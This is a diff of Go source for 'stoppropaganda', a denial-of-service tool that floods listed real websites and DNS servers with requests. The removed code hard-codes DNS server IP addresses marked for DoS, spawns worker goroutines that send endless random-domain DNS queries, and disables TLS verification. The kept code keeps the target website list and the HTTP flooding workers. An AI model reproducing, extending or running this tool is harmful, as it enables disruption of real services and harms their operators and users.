@@ -1,37 +1,16 @@
-package main
+package stoppropaganda
 
 import (
-	"crypto/tls"
-	"encoding/json"
-	"flag"
 	"io"
 	"io/ioutil"
-	"log"
-	"math/rand"
-	"net"
 	"net/http"
 	"net/url"
-	"os"
-	"strings"
 	"sync"
-	"time"
-
-	"github.com/miekg/dns"
-	"github.com/peterbourgon/ff/v3"
 )
 
-/*###
-##### https://twitter.com/FedorovMykhailo/status/1497642156076511233
-###*/
+// Source: https://twitter.com/FedorovMykhailo/status/1497642156076511233
 
-var dnsServersToDOS = map[string]struct{}{
-	"194.54.14.186:53": {},
-	"194.54.14.187:53": {},
-	"194.67.7.1:53":    {},
-	"194.67.2.109:53":  {},
-}
-
-var links = map[string]struct{}{
+var targetWebsites = map[string]struct{}{
 	/* Other countries */
 
 	"https://bukimevieningi.lt": {},
@@ -217,14 +196,7 @@ var links = map[string]struct{}{
 	"https://grodnonews.by":     {},
 }
 
-type DNSServer struct {
-	Requests     uint   `json:"requests"`
-	Success      uint   `json:"success"`
-	Errors       uint   `json:"errors"`
-	LastErrorMsg string `json:"last_error_msg"`
-
-	mux *sync.Mutex
-}
+var websites = map[string]*Website{}
 
 type Website struct {
 	Requests     uint   `json:"requests"`
@@ -238,128 +210,6 @@ type Website struct {
 	Counter_code500 uint `json:"status_500"`
 
 	mux *sync.Mutex
-}
-
-var dnsServers = map[string]*DNSServer{}
-var websites = map[string]*Website{}
-
-var httpClient http.Client
-
-var fs = flag.NewFlagSet("stoppropaganda", flag.ExitOnError)
-var (
-	flagWorkers    = fs.Int("workers", 20, "DOS each website with this amount of workers")
-	flagDNSWorkers = fs.Int("dnsworkers", 100, "DOS each DNS server with this amount of workers")
-	flagUserAgent  = fs.String("useragent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36", "User agent used in HTTP requests")
-	flagTimeout    = fs.Duration("timeout", 10*time.Second, "timeout of HTTP request")
-	flagBind       = fs.String("bind", ":8049", "bind on specific host:port")
-)
-
-func main() {
-	ff.Parse(fs, os.Args[1:], ff.WithEnvVarPrefix("SP"))
-
-	// DNS servers
-	for dnsServer := range dnsServersToDOS {
-		dnsServers[dnsServer] = &DNSServer{mux: &sync.Mutex{}}
-		dnsServers[dnsServer].Start(dnsServer)
-	}
-
-	// Websites
-	for link := range links {
-		websites[link] = &Website{mux: &sync.Mutex{}}
-		websites[link].Start(link)
-	}
-
-	http.HandleFunc("/status", status)
-	log.Println("Started!")
-	panic(http.ListenAndServe(*flagBind, nil))
-}
-
-type StatusStruct struct {
-	DNS      map[string]*DNSServer `json:"DNS"`
-	Websites map[string]*Website   `json:"Websites"`
-
-	mux *sync.Mutex
-}
-
-func status(w http.ResponseWriter, req *http.Request) {
-	statusStruct := StatusStruct{
-		DNS:      make(map[string]*DNSServer, len(dnsServers)),
-		Websites: make(map[string]*Website, len(websites)),
-
-		mux: &sync.Mutex{},
-	}
-
-	wg := sync.WaitGroup{}
-	wg.Add(len(dnsServers))
-	wg.Add(len(websites))
-
-	for endpoint, ds := range dnsServers {
-		go func(endpoint string, ds *DNSServer) {
-			ds.mux.Lock()
-			dnsServer := *ds
-			ds.mux.Unlock()
-
-			statusStruct.mux.Lock()
-			statusStruct.DNS[endpoint] = &dnsServer
-			statusStruct.mux.Unlock()
-
-			wg.Done()
-		}(endpoint, ds)
-	}
-
-	for endpoint, ws := range websites {
-		go func(endpoint string, ws *Website) {
-			ws.mux.Lock()
-			tmpWebsite := *ws
-			ws.mux.Unlock()
-
-			statusStruct.mux.Lock()
-			statusStruct.Websites[endpoint] = &tmpWebsite
-			statusStruct.mux.Unlock()
-
-			wg.Done()
-		}(endpoint, ws)
-	}
-
-	wg.Wait()
-
-	content, err := json.MarshalIndent(statusStruct, "", "    ")
-	if err != nil {
-		http.Error(w, "failed to marshal data", http.StatusInternalServerError)
-		return
-	}
-	w.WriteHeader(200)
-	w.Write(content)
-}
-
-func (ds *DNSServer) Start(endpoint string) {
-	c := new(dns.Client)
-	c.Dialer = &net.Dialer{
-		Timeout: *flagTimeout,
-	}
-
-	f := func() {
-		for {
-			domain := getRandomDomain()
-			m := new(dns.Msg)
-			m.SetQuestion(domain+".", dns.TypeAAAA)
-			_, _, err := c.Exchange(m, endpoint)
-
-			ds.mux.Lock()
-			ds.Requests++
-			if err != nil && !strings.HasSuffix(err.Error(), "no such host") {
-				ds.Errors++
-				ds.LastErrorMsg = err.Error()
-			} else {
-				ds.Success++
-			}
-			ds.mux.Unlock()
-		}
-	}
-
-	for i := 0; i < *flagDNSWorkers; i++ {
-		go f()
-	}
 }
 
 func (ws *Website) Start(endpoint string) {
@@ -422,32 +272,4 @@ func (ws *Website) Start(endpoint string) {
 	for i := 0; i < *flagWorkers; i++ {
 		go f()
 	}
-}
-
-func init() {
-	rand.Seed(time.Now().UnixNano())
-
-	fIgnoreRedirects := func(req *http.Request, via []*http.Request) error {
-		return http.ErrUseLastResponse
-	}
-	tr := &http.Transport{
-		DisableCompression: true,                                  // Disable automatic decompression
-		TLSClientConfig:    &tls.Config{InsecureSkipVerify: true}, // Disable TLS verification
-	}
-	httpClient = http.Client{
-		Timeout:       *flagTimeout,     // Enable timeout
-		CheckRedirect: fIgnoreRedirects, // Disable auto redirects
-		Transport:     tr,
-	}
-}
-
-var letterRunes = []rune("abcdefghijklmnopqrstuvwxyz")
-
-func getRandomDomain() string {
-	randomLength := rand.Intn(20-6) + 6 // from 6 to 20 characters length + ".ru"
-	b := make([]rune, randomLength)
-	for i := range b {
-		b[i] = letterRunes[rand.Intn(len(letterRunes))]
-	}
-	return string(b) + ".ru"
 }
